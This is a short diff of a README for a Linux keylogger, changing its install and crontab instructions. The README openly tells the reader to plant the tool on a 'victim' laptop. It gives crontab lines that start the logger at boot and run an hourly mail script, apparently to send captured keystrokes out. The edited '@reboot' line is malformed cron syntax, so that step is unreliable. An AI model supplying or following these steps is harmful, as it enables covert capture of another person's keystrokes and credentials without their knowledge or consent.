@@ -4,7 +4,7 @@ Just a simple keylogger for linux
 
 ### Installing the required dependencies
 
-        pip3 install -r requirements.txt
+    pip3 install -r requirements.txt
 
 ### Plant it own victim laptop
 copy the files to any directory
@@ -14,7 +14,7 @@ on victim linux machine open linux terminal and crontab to run it at boot
 
 and at  the end of crontab add the following
 
-    * * * * * cd (directory of keyloger) ; ./kl.py &
+    @reboot * * * * cd (directory of keyloger) ; ./kl.py &
     0 * * * * cd (directory of keyloger) ; ./mail.py
 
 restart the crontab or reboot
